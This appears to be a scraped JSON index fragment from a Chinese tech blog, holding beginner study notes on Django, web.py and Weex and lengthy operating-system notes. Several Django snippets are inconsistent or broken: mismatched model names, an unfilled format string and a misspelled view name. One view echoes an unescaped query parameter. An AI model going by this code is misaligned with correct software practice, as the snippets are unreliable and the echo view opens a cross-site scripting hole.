django_demo\nsettings.py是django项目的配置文件，urls.py是django项目的路由文件，wsgi.py是django作为wsgi应用的配置文件（wsgi，全成web server gateway interface，这个文件用来部署应用服务器），manage.py是django项目的管理文件，init.py是Django项目的包初始化文件\nwsgi：Web服务器网关接口（Python Web Server Gateway Interface，缩写为WSGI）是为Python语言定义的Web服务器和Web应用程序或框架之间的一种简单而通用的接口。（来自百度百科）\n运行django项目\npython .\\manage.py runserver 0.0.0.0:8000\n访问127.0.0.1:8000\ndjango应用\ndjango应用和django项目的区别：django项目是基于django的web应用，可以独自运行，django应用是一个可复用（重用）的Python软件包\ndjango项目下可以包含一组配置和n个django应用\n创建django应用\npython .\\manage.py startapp django_app\nadmin.py #定义admin模块管理的配置文件\napps.py # 声明应用的配置文件\ntests.py # 应用测试的配置文化\nmodels.py #定义应用模型配置文件\nviews.py #视图处理配置文件\nurls.py # 管理应用路由的配置文件，因为应用也可以管理路由，不过需要自己创建\ndjango应用用法：\n修改settings.py，找到INSTALLED_APP，添加\u0026quot;django_app\u0026quot;（用于挂载该应用），找到TEMPLATES下的DIRS，添加os.path.join(BASE_DIR, \u0026ldquo;templates\u0026rdquo;)，（用于加载模板文件），找到ALLOWED_HOSTS，修改为ALLOWED_HOSTS = [\u0026rsquo;*\u0026rsquo;]，（让外界可访问到后台站点）\ndjango视图\u0026amp;django路由\n简单配置一个路由来获取请求的数据\nviews.py\ndef hallo(request):\rname = request.GET.get(\u0026quot;name\u0026quot;)\rreturn HttpResponse('{}'.format(name))\r项目的urls.py（在urlpatterns数组中添加，abc为路由）\npath(\u0026quot;abc/\u0026quot;,include(\u0026quot;django_app.urls\u0026quot;))\r不要忘了导入include\nfrom django.urls import path, include\r在应用下新建一个urls.py\nfrom django.urls import path, include\rimport django_app.views\rurlpatterns = [\rpath(\u0026quot;hallo\u0026quot;,django_app.views.hallo)\r]\r上面例子中，访问/abc将触发一个应用级路由，该应用路由的返回值为该应用的views.py下的hallo函数\n另外到settings.py中添加应用\nINSTALLED_APPS数组下添加\u0026quot;django_app.apps.DjangoAppConfig\u0026quot;\n应用名.apps.xxxConfig\nxxxConfig可以到apps.py中找到\n访问http://127.0.0.1:8000/abc/hallo?name=admin，可以看到输出了admin\n模型层（位于视图层和数据库之间的组件）\n模型层主要目的：Python对象和数据库表之间的转换，屏蔽不同的数据库的差异，提供更多的数据库工具（备份等等）\n模型层字段定义\n数字类型：IntegerField\n文本类型：TextField\n日期类型：DataTimeField\n布尔类型：BooleanField\n自增：AutoField\n主键：primary_key属性\n在settings.py中找到DATABASES，这是用来配置模型层和数据库的配置\n另外需要到应用的models.py中定义模型\nclass demotest(models.Model):\rdemo_id = models.AutoField(primary_key=True)\rtitle = models.TextField()\rcontent = models.TextField()\rdemo_data = models.DateTimeField(auto_now=True)\rdef __str__(self):\rreturn self.title\r然后生成迁移文件，执行迁移文件，执行迁移文件后就是可以同步到数据库中\ndjango shell（交互式编程，方便测试，方便开发，继承django项目环境）\n启动django shell\npython manage.py shell\n测试一下刚才创建的模型\nfrom django_app.models import Main\rmain = Main()\rmain.title = \u0026quot;test django\u0026quot;\rmain.content = \u0026quot;hallo word\u0026quot;\rmain.save()\rdatas = Tast.objects.all()\rdata = datas[0]\rprint(data.title)\rAdmin模块（管理）\n主要用途：认证用户，显示管理模型，检查输入等等\n创建管理员用户\npython manage.py createsuperuser\n会要求输入用户名和邮箱，以及密码\n注册模型\nadmin.py\nfrom .models import datas\radmin.site.register(datas)\r返回数据库中的数据\nviews.py\nfrom django_app.models import datas\rdef data_content(request):\rdata = datas.objects.all()[0]\rtitle = data.title\rcontent = data.content\rdemo_id = data.demo_id\rdemo_data = data.demo_data\rreturn_str = \u0026quot;title: %s, demo_id: %s, demo_data : %s, content: %s (title,demo_id,demo_data,content)\u0026quot;\rreturn HttpResponse(return_str)\r应用路由配置\npath(\u0026quot;data\u0026quot;,django_app.views.data)\r项目路由配置（如果已经配置转发到应用的路由，就不用再配置了）\n模板系统\n除了模板外，也可以直接上静态文件（html，css，JavaScript等等）\n在应用目录下新建一个目录，templates，在该目录下新建一个html\n当然使用模板系统更好更分别，毕竟逻辑和设计要分开\n模板基础语法\n变量：{{ data }} for循环：{% for data in datas %},{% endfor %} if判断：{% if %},{ % else % },{% endif %}\n启用模板系统 views.py\ndef index_page(request):\rall_data = datas.objects.all()\rreturn render(request, \u0026quot;templates/index.html\u0026quot;,{\r\u0026quot;datas\u0026quot;: all_data\r})\rpass\r应用路由配置\npath(\u0026quot;index\u0026quot;,django_app.views.ndex_page)\r页面跳转\n","permalink":"https://99999.fun/posts/118/","summary":"django是一个基于Python编写的Web框架\nDjango采用了MVT的设计模式（模型，视图，模板）（mvt设计模式是基于mvc设计模式的）\n安装django\npip install django\n检查是否安装成功\ndjango-admin\ndjango常用命令\nstartproject #创建django项目\nstartapp #创建django应用\ncheck #检查校验项目完整性\nrunserver #本地运行django项目\nshell # 进入django项目的shell环境（Python）\ntest # 执行django实例测试\nmakemigrations # 创建模型变更的迁移文件\nmigrate # 执行迁移文件\ndumpdata # 数据库数据导出\nloaddata # 文件数据导入数据库\n创建第一个项目\ndjango-admin startproject django_demo\nsettings.py是django项目的配置文件，urls.py是django项目的路由文件，wsgi.py是django作为wsgi应用的配置文件（wsgi，全成web server gateway interface，这个文件用来部署应用服务器），manage.py是django项目的管理文件，init.py是Django项目的包初始化文件\nwsgi：Web服务器网关接口（Python Web Server Gateway Interface，缩写为WSGI）是为Python语言定义的Web服务器和Web应用程序或框架之间的一种简单而通用的接口。（来自百度百科）\n运行django项目\npython .\\manage.py runserver 0.0.0.0:8000\n访问127.0.0.1:8000\ndjango应用\ndjango应用和django项目的区别：django项目是基于django的web应用，可以独自运行，django应用是一个可复用（重用）的Python软件包\ndjango项目下可以包含一组配置和n个django应用\n创建django应用\npython .\\manage.py startapp django_app\nadmin.py #定义admin模块管理的配置文件\napps.py # 声明应用的配置文件\ntests.py # 应用测试的配置文化","title":"Django学习笔记"},{"content":"web.py是一个轻量级Python web框架，是由已故著名计算机黑客Aaron Swartz设计开发（如果你看过互联网之子这个电影，你应该对这位大佬很熟悉）\n安装web.py\npip install web.py\n导入模块\nimport web\n第一个例子\nimport web\rurls = (\r\u0026quot;/(.*)\u0026quot;,\u0026quot;hallo\u0026quot;\r)\rapp = web.application(urls,globals())\rclass hallo:\rdef GET(self,name):\rreturn \u0026quot;\u0026lt;h1\u0026gt;hallo web.py\u0026lt;/h1\u0026gt;\u0026quot;\rif __name__==\u0026quot;__main__\u0026quot;:\rapp.run()\r可以看到页面内容是return返回的，也可以open读取html文件，来返回回去，都是可以的\n","permalink":"https://99999.fun/posts/117/","summary":"web.py是一个轻量级Python web框架，是由已故著名计算机黑客Aaron Swartz设计开发（如果你看过互联网之子这个电影，你应该对这位大佬很熟悉）\n安装web.py\npip install web.py\n导入模块\nimport web\n第一个例子\nimport web\rurls = (\r\u0026quot;/(.*)\u0026quot;,\u0026quot;hallo\u0026quot;\r)\rapp = web.application(urls,globals())\rclass hallo:\rdef GET(self,name):\rreturn \u0026quot;\u0026lt;h1\u0026gt;hallo web.py\u0026lt;/h1\u0026gt;\u0026quot;\rif __name__==\u0026quot;__main__\u0026quot;:\rapp.run()\r可以看到页面内容是return返回的，也可以open读取html文件，来返回回去，都是可以的","title":"Web.py学习笔记"},{"content":"weex是阿里巴巴在Qcon大会上宣布开源的一套跨平台移动开发工具\n支持ES6，跨平台，体积小，性能优异，编写规范\n官网：http://emas.weex.io/zh/\nweex调试工具：weexplayground（可以用来测试，要同局域网下）\n安装\nnpm install -g weex-toolkit\n检查weex\nweex -v\n初始化项目\nweex init demo\nnpm install\n或者\nweex create demo\n运行\nnpm run dev\nnpm run server\n编译js bundle\nweex compile 目录或者文件 打包文件存放的目录或者文件\n压缩编译\nweex compile 目录或者文件 打包文件存放的目录或者文件 -m\n注意：Weex目前只支持像素值，不支持相对单位(em、rem)，也不支持百分比，默认设计标准为750px，当真实像素不是750px的时候，会自动将设计标准映射到真实的尺寸中，这个映射比率叫scale，计算公式为：当前屏幕尺寸/750\n不支持层 z-index，具体层级叠加根据编写顺序显示，不支持使用border创建三角形\n运行流程：weex生成js bundle，然后通过网络等等方式将js bundle传递到客户端，在客户端中，weexSDK会在用户打开一个weex页面的时候执行对应的js bundle，然后命令发送到native端进行处理\n","permalink":"https://99999.fun/posts/116/","summary":"weex是阿里巴巴在Qcon大会上宣布开源的一套跨平台移动开发工具\n支持ES6，跨平台，体积小，性能优异，编写规范\n官网：http://emas.weex.io/zh/\nweex调试工具：weexplayground（可以用来测试，要同局域网下）\n安装\nnpm install -g weex-toolkit\n检查weex\nweex -v\n初始化项目\nweex init demo\nnpm install\n或者\nweex create demo\n运行\nnpm run dev\nnpm run server\n编译js bundle\nweex compile 目录或者文件 打包文件存放的目录或者文件\n压缩编译\nweex compile 目录或者文件 打包文件存放的目录或者文件 -m\n注意：Weex目前只支持像素值，不支持相对单位(em、rem)，也不支持百分比，默认设计标准为750px，当真实像素不是750px的时候，会自动将设计标准映射到真实的尺寸中，这个映射比率叫scale，计算公式为：当前屏幕尺寸/750\n不支持层 z-index，具体层级叠加根据编写顺序显示，不支持使用border创建三角形\n运行流程：weex生成js bundle，然后通过网络等等方式将js bundle传递到客户端，在客户端中，weexSDK会在用户打开一个weex页面的时候执行对应的js bundle，然后命令发送到native端进行处理","title":"weex跨平台框架学习笔记"},{"content":"操作系统是管理计算机硬件和软件资源，并且提供用户交互的软件系统\n常见操作系统有Windows，Linux，Android\n操作系统具备管理计算机资源的功能，具备抽象计算机资源的能力，能和用户进行交互\n操作系统实质上是一个很复杂的控制软件，可以管理应用，资源管理，管理外设等等\n操作系统的架构的层次是在硬件之上，应用之下\nOS Kernel：可并发（同时存在多个运行的应用）。可共享，可虚拟，可异步\n微内核：尽可能将内核功能移植到用户空间，缺点就是性能低\n外核和内核：一个负责硬件，一个负责软件\nDISK（硬盘存储）：存储OS\nBIOS：基本I/O处理系统（加载外设以及加载软件来运行OS） （basic I/O system)\nBootLoader：加载OS\nPOST（加电自检，查找显卡和执行BIOS）\n系统调度：来源于“合法”的应用向系统发出服务请求的（同步或者异布）\n异常：来源于“不良”的应用非法指令（或者应用意想不到的请求，应用无法获得资源需求）（同步）\n中断：来源于外设对于硬件设备和网络中断（异步）\n逻辑化地址空间，独立地址空间，可访问相同内存，更多内存空间（虚拟化）\n物理地址空间：硬件支持的地址空间\n逻辑地址空间：应用程序拥有的内存范围\n操作系统为了运行多个程序，进行了内存地址的隔离（分配独立的虚拟内存地址），虚拟内存地址和物理内存地址是映射关系\n应用逻辑地址映射到物理地址\nCPU需要逻辑地址上的内存内容（ALU），内存管理单元（MMU）寻找逻辑地址和物理地址之间的映射，控制器将从总线发送物理地址的内存内容的请求\n内存发送物理地址内存内容给CPU（告诉CPU，物理地址找到了），建立逻辑地址和物理地址之间的映射（确保应用互不干扰）\n虚拟地址和物理地址的映射关系管理\n内存分段（内存被看成一组不同长度的段）\n内存分段下的虚拟地址分为段选择⼦和段内偏移量\n段选择⼦保存在段寄存器中，段选择⼦其中的段号被用于段表的索引，段表中保存的是这个段的基地址和段界限等等\n而段内偏移量是位于0和段界限之间的，如果段内偏移量合法，那么段内偏移量加段的基地址得到物理内存地址\n分段的内存碎片问题，如果某个程序占用了128mb内存，然后该程序被关闭了，释放128mb内存，如果这个128mb内存不是连续的，而是被分段了，这将导致没有内存空间打开另一个内存占用128mb的程序\n内存分页（将物理内存和虚拟内存切成一段段固定大小的内存空间）\n内存分页解决了内存分段的内存碎片问题，其释放内存是以页为单位释放的，当内存空间不够，会释放其他正在运行的进程的没使用的内存页面\n内存分页下的虚拟地址被分为页号和页内偏移，页好为页表的索引，页表保存着物理页的所在物理内存的基地址，基地址和页内偏移组成物理内存地址\n内存分页的缺点就是在运行多线程时，页表会非常大，所以出现了多级⻚表（将页表分成一级一级的）\n段⻚式内存管理（内存分段和内存分页的结合体）\n先将内存分为多个段，再将每个端分为多个页，地址通过段号，段内⻚号和⻚内位移组成\n连续性内存管理（内存碎片和分区的动态分配）\n外部碎片：在分配单元间的未使用内存\n内部碎片：在分配单元中的未使用内存\n当一个应用被批准运行在内存中时，分配一个连续的区间，来给运行的应用访问数据\n动态分配的策略：当想分配某字节，先从低地址找，找到第一个被某字节大的空闲块，就使用它\n动态分配的缺点就是外部碎片严重\n非连续内存分配\n分段Segmentation：\n逻辑地址空间连续，物理地址离散\n一个段表示一个内存块，一个逻辑地址空间，应用访问内存地址的时候，需要个二维的二元组\n虚拟内存：\n早期内存不够应用消耗，应用的规模比存储器的容器大\n当应用太大，超出内存，可采用手动的覆盖(overlay) 技术，只把需要的指令和数据保存在内存中\n当应用太多，超出内存，可采用自动的交换(swapping) 技术，把暂时不能执行的程序送到外存（磁盘）中\n进程和线程：\n进程状态(state)，线程(thread)，进程间通信(inter-process communication)，进程互斥与同步，死锁(deadlock)\n进程包含正在运行的应用的全部状态信息\n进程可动态化创建，结束进程，可以被独立调度并占用处理，不同的进程互不影响，可访问共享数据或者资源\n进程控制块(process control block, PCB)：进程的数据结构，操作系统管理控制进程运行所用的信息集合，操作系统为每一个进程都维护了一个PCB，用来存储保存和该进程有关的状态信息\n进程是操作系统最小可调度的资源单位\n多个程序运行在单核心CPU服务器上，实质就是在共享时间片（时间片，操作系统将某个程序分配到某段CPU时间上，单核是无法同时运行多个程序的，只能共享时间片，而进程就是因此而生）\n进程状态有3种，分别是运行，阻塞以及就绪\n运行和就绪可互相转换，运行状态就是CPU指令在读取运行进程中的程序段，而就绪就是该进程在等待调用\n运行可切换到阻塞状态\n阻塞就是进程在等待信号（依赖的资源没有就位），阻塞状态结束后会切换到就绪状态\n进程状态的切换可理解为接力赛跑，运行状态就是正在跑的运动员，而就绪状态就是在等待接力棒的运动员，而阻塞状态就是运动员需要补充休息，暂时不跑了\n进程发生阻塞时，该进程将放弃CPU使用权，CPU会执行下一个就绪状态的进程\n中断和中断向量\n当程序发生中断（CPU暂时中断当前正在运行的程序），CPU转去处理其他的程序（也可能是处理内存的数据），当CPU处理完毕，CPU可恢复到之前被暂时中断当前正在运行的程序的状态，这个过程叫中断\n中断向量就是中断程序的入口地址\n中断发生时，该进程会第一时间保存被中断程序的状态，会将相关数据保存到寄存器，当CPU通过中断向量，跳转到处理中断程序中去，并且执行中断程序，然后决定下一个执行哪个程序，如果这个程序正好是之前被中断的，会从寄存器中读取相关数据。恢复到之前中断的执行状态\n任何进程都需要排队等待\n进程中断和进程阻塞的区别：中断是由于一些优先级比较高的需要CPU处理而被迫中断执行，而阻塞是因为进程需要一些依赖，但是依赖没有就位，需要等待就位，该进程就会进入到阻塞队列中，当依赖就位，就恢复到就绪状态，等待进程调度系统分配CPU执行权\n进程（Process）是计算机中的程序关于某数据集合上的一次运行活动，是系统进行资源的分配和调度的基本单位，每个进程都拥有一个自己的地址空间，进程至少有5种基本状态，分别是：初始状态，执行状态，等待状态，就绪状态，终止状态\n线程（Thread）是进程的执行实例，是程序执行的最小单位，是操作系统能够进行运算调度的最小单位，一个进程可以创建多个线程，同一个进程的线程共享进程的内存信息，同一个进程的多个可以并发执行，一个线程要执行，必须至少有一个进程\n并发和并行的区别\n并发：指一个时间段中有多个线程（程序）被快速的轮换执行（处于启动运行到运行完毕之间），在一个时间段中只有一个线程（程序）在执行，在宏观上感觉是多个线程同时被处理，如果多线程操作在一个cpu上，操作系统将cpu运行时间分隔为若干个时间段，将时间段分配给各个线程执行，在一个时间段的线程执行时，其他线程将处于挂起状态，这就叫并发\n并行：当系统拥有多个cpu（1个以上）时，一个cpu执行一个线程，另一个线程执行另一个线程，同时进行处理，这就叫并行\n并发和并行的区别：并发一个时间段只能执行一个线程（多个线程需要排队执行），并行可以在一个时间段中同时执行多个线程\n当多线程程序在单核CPU上执行时，就是并发，在多核CPU执行时，就是并行，当线程数大于CPU核数，那么既有并行又有并发\n进程调度的性能消耗太大，因为进程调度会导致进程中断，不但需要将数据保存在寄存器中，恢复进程还需要从寄存器中读取数据，而调度线程的性能消耗就很小，线程是进程的执行单元，一个进程中最少存在一个线程\n进程的竞争和临界区\n临界区：指的是共享内存中的程序片段\n当两个进程同时访问了临界区，而临界区中的数据正好不能被同时访问，例如进程A读取了临界区中的某个内存，并且修改了这个内存，但是进程B正好在读取该临界区的这个内存，导致读取的数据是错的，而解决这个问题的最简单方法就是互斥，当一个进程在该临界区中时，其他进程不能进入，需要排队等待，而且不能过于长时间的占用临界区，临界区外的进程不影响到临界区内的进程\n死锁：当多个进程因为竞争资源或者进程通信而导致的阻塞现象，进程在互相等待，无法进行下一步操作\n严格轮换法，Peterson算法\n严格轮换法简单来说就是声明一个状态，某个进程进入临界区时，状态为1，出来的时候状态为0，当其他进程看到状态为1时，等待该进程出来，看到状态为0时，进入临界区\nPeterson算法是严格轮换法的优化版，实现了互斥的同时又避免的死锁\nPeterson算法的思路是声明2个状态（一个是正在使用临界区的状态，另一个是想进入临界区的状态），当一个进程想进入临界区时，会检查一下其他进程是否想进入临界区，如果存在其他进程想进入临界区，则等待\nFHS规范（3.0），全称Filesystem Hierarchy Standard，中文翻译为文件系统层次结构标准，用于定义根目录以及一级子目录的规范，大多数Linux版本使用该标准来定义文件系统（并不一定完全符合规范，只是大概上符合）\nFHS规范定义了系统各个目录应该要放什么文件数据，以及所需要的文件和目录\n例如：规范某一些文件或者目录可以分享或者不可以分享给给其他人使用\nFHS规范了根目录(/)，以及根目录的子目录etc（配置文件），bin（必要软件或者命令），usr（二级目录），home（当前用户的家目录），var（动态数据）\nLinux文件系统\u0026mdash;VFS（虚拟文件系统）（Linux下一切都是文件）\nVFS不需要考虑不同文件系统和存储介质的差异，因为其内核抽象出了通用的文件系统接口，只要符合接口标准，一些文件或者比较特殊的文件系统都是可以兼容\nVFS抽象对象，超级块：文件系统，目录项：文件的路径，索引节点：具体文件（操作文件的具体信息），文件：进程打开的文件。都有自己的接口来操作\nXFS（高性能64位日志文件系统），带有日志功能防丢数据，原生提供备份工具（xfsdump/sfsrestore）\n图灵机和冯诺依曼模型\n图灵机实质就是机器模拟人类在纸上进行数学运算，先将数值写到一个纸带的小方格中，再通过读写头来读取小方格里面的信息\n这个读写头具备存储，运算，控制功能。存储读取的数据以及运算出来的数据，可执行运算指令，可识别数据是运算指令（例如加号，减号等等运算符号）还是数字\n冯诺依曼模型（约定使用二进制来存储和计算数据，并且定义计算机基本结构，CPU，内存，输入设备，输出设备，总线，具备这5个部分的计算机就是冯诺依曼模型）\nCPU：中央处理器，64位处理器（64位指的CPU的位宽，位宽决定了处理器一次可以计算处理多少字节的数据，64位处理器可以一次计算8个字节）\nCPU内部还有寄存器（存储CPU计算时的数据），运算单元（负责计算），控制单元（控制CPU工作）\n常见的寄存器有：通用寄存器（存储需要进行计算的数据），程序计数器（存储CPU要执行下一个指令的内存地址），指令寄存器（存储程序计数器指向的指令）\n总线（CPU和其他设备之间的通信，总线被分为3种，地址总线（传送外部存储器（内存）的地址），控制总线（用来传输和接收控制信号），数据总线（传送内存的数据信息，数据总线又分单向传输，双向传输））\n输入输出设备（输入设备通过控制总线和CPU通信，CPU处理后，将数据输出给输出设备）\n线路传输：通过电压来传输数据，低电压表示0，高电压表示1，一条线路可传输1bit的数据（二进制，0或1）\n32位处理器的最大寻址空间为2的32次方（4294967296，大概4GB左右），所以32位CPU（或者操作系统）只能操作4G内存（而64位理论上寻址范围高达2的64次方）\nCPU执行过程：CPU读取程序计数器的值（指令内存地址），控制单元通过地址总线访问到内存，并且通过数据总线获取数据给CPU，CPU接收到数据，将该数据存储在指令寄存器，CPU处理指令寄存器的数据，确定数据的类型，如果是计算类，就交给运算单元处理，如果是存储类，就交给控制单元处理，CPU处理完毕后，程序计数器的值自增（用来表示下一条指令，自增取决于CPU的位宽，如果是64位处理器就是自增8（因为64位一次性处理8个字节数据，一个字节数据需要一个地址来存放））\nCPU会不断执行该过程，直到结束（这个过程叫CPU的指令周期）\nCPU的执行速度取决于指令的执行速度，而指令的执行速度取决于CPU的时钟频率（Ghz），例如我电脑的CPU是 2.10 GHz的，这个 2.10 GHz指的是1秒内可以产生2.1G次数的脉冲信号，而每一次脉冲信号的高低电平的转换就是时钟周期（振荡周期）\n时钟频率越高，时钟周期越低，CPU的处理速度越快\n存储器\n内存断电，数据会丢失，而硬盘不会，因为硬盘是持久化存储，而且CPU内部也有存储器（只不过其能存储的数据很小）\n寄存器处理速度最快，再到CPU Cache（中⽂称为CPU缓存，一般分为L1,L2,L3这样的缓存层，比如我电脑的r5 3550h的一级缓存为384KB，二级缓存为2MB，三级缓存为4MB，二级缓存是一级缓存的缓冲器，三级缓存是二级缓存的缓冲器）\n然后再到内存，最后是硬盘\n一个主频为2.1Ghz的CPU，表示其1秒内完成2.1x10的9次方个时钟周期\nCPU Cachee使用了⼀种叫 静态随机存取存储器（Static Random-Access Memory，SRAM）的存储器，一旦断电就会丢失数据\n每个CPU核心都有属于自己的L1缓存和L2缓存，而L3缓存一般是多核心共享的\n内存使用的是一种叫动态随机存取存储器（Dynamic Random Access Memory，DRAM）的存储器\nSRAM存储1bit的数据，一般情况需要6个晶体管，而DRAM只需要一个晶体管和一个电容\n硬盘就是固体硬盘（分为HDD硬盘（Hard Disk Drive）和SSD硬盘(Solid-state disk)），HDD硬盘结构和内存相似，但是和内存，缓存之类的不同的是其断电，数据不会丢失\nCPU Cachee的数据是从内存中获取的，通过Cache Line（缓存块）来一块一块获取，L1缓存一般分为数据缓存和指令缓存\n补码：将正数的二进制全部取反再加1，补码被用于处理负数\n十进制小数转二进制用的是乘2取整法（将小数部分乘以2，作为二进制的一位，一直到不存在小数，整数还是用除2法，再合并就是小数的二进制结果）\n不是所有小数都可以乘2取整的，例如0.1就不能取整，无法使用二进制精确表示0.1，只能使用近似值来表示，这将导致精度缺失的情况发生\n操作系统内核：连接硬件设备的桥梁，应用只需要和内核交互，无需关注硬件，内核已提供访问硬件的接口\n现代操作系统内核支持进程调度，内存管理，硬件通信，提供系统接口等功能\n内核权限很高，并且将内存分称2个部分，分别是内核空间（只有内核程序可访问），用户空间（专门提供给应用使用）\n当程序在使用用户空间时，那么该程序在用户态执行，如果在使用内核空间，那么该程序在内核态执行\n内核一般分为三种，宏内核（Linux为代表，整个内核是一个完整的程序），微内核（具备一个小内核，一些服务或者模块由用户态来管理）以及混合内核（宏内核和微内核的结合体，windows为代表）\n计算机的输入，输出，状态转换函数F\n状态描述：一切可使用数字描述\n输入：晶振（时间输入，CPU周期，时钟驱动CPU工作），外界输入设备\n输出：打印机，显示器\n机械计算机：差分机（巴贝奇，多项式求值）\n图灵机\n冯 诺依曼模型\nCPU的工作原理（内存，寄存器，ALU（算数逻辑单元））\n数据空间地址和指令空间地址\n指令\n通过指令来控制计算机工作，CPU被时钟驱动，并且不断读取指针指向的指令，从内存读取指令然后执行指令\n不同的cpu架构使用不同的指令集，常见的指令集有RISC（Reduced Instruction Set Computing，精简指令集），CISC（Complex Instruction Set Computing，复杂指令集）\nRISC中代表的有arm指令集，CISC中代表的有x86指令集\nRISC的特点就是CPU单元电路少，面积小，功耗低（只进行二进制处理器指令）\nCISC的特定就是CPU单元电路多，面积大，功耗大（进行复杂指令）\n寻址模式，浮点数，指令分类\n寻址模式（指令集的一部分，表示指令有哪些操作符，地址应该怎么计算）\n寄存器寻址，立即寻址，偏移量寻址（基地址，偏移量），PC相对寻址\n内存读写（load/store指令），加减乘除（add，sub，div，mult）。\n操作系统的并发性（2个事件及2个以上事件在一段时间内发生，就叫并发，并发是单核CPU的知识点），共享性（操作系统的资源可以提供给多个并发程序使用，互斥共享，同时访问（一段时间内并发访问资源）），虚拟性（将物理设备虚拟成多个逻辑实体，虚拟技术有时分复用（分时使用硬件资源，例如虚拟处理器技术，就是将多个程序分时复用处理器资源，虚拟设备技术，就是将物理设备虚拟成多个逻辑设备，一个程序使用一个逻辑设备，通过逻辑设备来并发访问真实的物理设备），空分复用技术（虚拟磁盘技术（将物理磁盘虚拟成多个逻辑盘），虚拟内存技术（可使用比实际内存更大的内存空间））），异步性（允许多进程并发执行）\n信号量（semaphore）\n信号量是操作系统解决不同进程之间共享资源互斥和同步的原语（原语，控制进程，一个程序段，一旦执行，那么就要执行完毕，过程不可中断，并且常驻内存，并且是原子操作（英文primitive or atomic action，表示该操作的全部动作必须做完或者不做，是不可被分割的）的，在管态（即内核态，处理器可在该下执行指令系统的全集，另外还有目态，即用户态，目态切换管态只能通过中断完成，因为当程序在目态下执行特权指令时，会发生中断，让操作系统来完成，避免用户态程序对系统发生破坏，而管态切换目态只需要修改状态字就可以了）执行）\n阻止恶意操作和保护数据使用到了一种叫hierarchical protection domains的机制，中文翻译为分级保护域，这个分级rings特权级分为四个级别，分别是0，1，2，3 0拥有最高权限，3拥有最低的权限，例如在Windows，只使用了两个级别，0和3，Windows下应用程序工作在3级，只能访问3级的数据，而操作系统内核和驱动工作在0级，可访问全部级别的数据 在低权限的级别上工作，想执行特权指令是不行的，只能通过系统内核调用完成（而这个内核调用的过程就是CPU运行级的用户态与内核态的转换），这个机制是为用户程序和服务程序对资源的利用隔离\n负级的保护，实际上并没有定义负级的（这个是微软的说法，用于hypervisor层运行），Ring -1的例如有VT-x 与 AMD-V（这两个支持全虚拟化，也就是硬件辅助虚拟化技术（Hardware-assisted Virtualization Machine）），VT-x 与 AMD-V都定义了一个新的保护级，可以让vmm运行在比ring0级别权限更高的级别上（也就是Ring -1）\nVT-x将保护级别分为两种操作模式，分别为根操作模式（vmm运行在该模式中，）和非根操作模式（vm机运行在该模式），这两个操作模式都有Ring0到Ring3 的全部指令级别\nvm机可以正常运行在Ring 0 级别，因为发出什么级别的指令都会进入到根操作模式的虚拟层中\n运行在ring级别越低，行为可见性越低，对ring级别高的程序来说，就是不可见的，比如ring3的应用程序是无法感知内核级别干了什么的，因此当在ring级别低的层级中运行恶意程序，其行为被察觉和查杀将变的更难\n","permalink":"https://99999.fun/posts/115/","summary":"操作系统是管理计算机硬件和软件资源，并且提供用户交互的软件系统\n常见操作系统有Windows，Linux，Android\n操作系统具备管理计算机资源的功能，具备抽象计算机资源的能力，能和用户进行交互\n操作系统实质上是一个很复杂的控制软件，可以管理应用，资源管理，管理外设等等\n操作系统的架构的层次是在硬件之上，应用之下\nOS Kernel：可并发（同时存在多个运行的应用）。可共享，可虚拟，可异步\n微内核：尽可能将内核功能移植到用户空间，缺点就是性能低\n外核和内核：一个负责硬件，一个负责软件\nDISK（硬盘存储）：存储OS\nBIOS：基本I/O处理系统（加载外设以及加载软件来运行OS） （basic I/O system)\nBootLoader：加载OS\nPOST（加电自检，查找显卡和执行BIOS）\n系统调度：来源于“合法”的应用向系统发出服务请求的（同步或者异布）\n异常：来源于“不良”的应用非法指令（或者应用意想不到的请求，应用无法获得资源需求）（同步）\n中断：来源于外设对于硬件设备和网络中断（异步）\n逻辑化地址空间，独立地址空间，可访问相同内存，更多内存空间（虚拟化）\n物理地址空间：硬件支持的地址空间\n逻辑地址空间：应用程序拥有的内存范围\n操作系统为了运行多个程序，进行了内存地址的隔离（分配独立的虚拟内存地址），虚拟内存地址和物理内存地址是映射关系\n应用逻辑地址映射到物理地址\nCPU需要逻辑地址上的内存内容（ALU），内存管理单元（MMU）寻找逻辑地址和物理地址之间的映射，控制器将从总线发送物理地址的内存内容的请求\n内存发送物理地址内存内容给CPU（告诉CPU，物理地址找到了），建立逻辑地址和物理地址之间的映射（确保应用互不干扰）\n虚拟地址和物理地址的映射关系管理\n内存分段（内存被看成一组不同长度的段）\n内存分段下的虚拟地址分为段选择⼦和段内偏移量\n段选择⼦保存在段寄存器中，段选择⼦其中的段号被用于段表的索引，段表中保存的是这个段的基地址和段界限等等\n而段内偏移量是位于0和段界限之间的，如果段内偏移量合法，那么段内偏移量加段的基地址得到物理内存地址\n分段的内存碎片问题，如果某个程序占用了128mb内存，然后该程序被关闭了，释放128mb内存，如果这个128mb内存不是连续的，而是被分段了，这将导致没有内存空间打开另一个内存占用128mb的程序\n内存分页（将物理内存和虚拟内存切成一段段固定大小的内存空间）\n内存分页解决了内存分段的内存碎片问题，其释放内存是以页为单位释放的，当内存空间不够，会释放其他正在运行的进程的没使用的内存页面\n内存分页下的虚拟地址被分为页号和页内偏移，页好为页表的索引，页表保存着物理页的所在物理内存的基地址，基地址和页内偏移组成物理内存地址\n内存分页的缺点就是在运行多线程时，页表会非常大，所以出现了多级⻚表（将页表分成一级一级的）\n段⻚式内存管理（内存分段和内存分页的结合体）\n先将内存分为多个段，再将每个端分为多个页，地址通过段号，段内⻚号和⻚内位移组成\n连续性内存管理（内存碎片和分区的动态分配）\n外部碎片：在分配单元间的未使用内存\n内部碎片：在分配单元中的未使用内存\n当一个应用被批准运行在内存中时，分配一个连续的区间，来给运行的应用访问数据\n动态分配的策略：当想分配某字节，先从低地址找，找到第一个被某字节大的空闲块，就使用它\n动态分配的缺点就是外部碎片严重\n非连续内存分配\n分段Segmentation：\n逻辑地址空间连续，物理地址离散\n一个段表示一个内存块，一个逻辑地址空间，应用访问内存地址的时候，需要个二维的二元组\n虚拟内存：\n早期内存不够应用消耗，应用的规模比存储器的容器大\n当应用太大，超出内存，可采用手动的覆盖(overlay) 技术，只把需要的指令和数据保存在内存中\n当应用太多，超出内存，可采用自动的交换(swapping) 技术，把暂时不能执行的程序送到外存（磁盘）中\n进程和线程：\n进程状态(state)，线程(thread)，进程间通信(inter-process communication)，进程互斥与同步，死锁(deadlock)\n进程包含正在运行的应用的全部状态信息\n进程可动态化创建，结束进程，可以被独立调度并占用处理，不同的进程互不影响，可访问共享数据或者资源\n进程控制块(process control block, 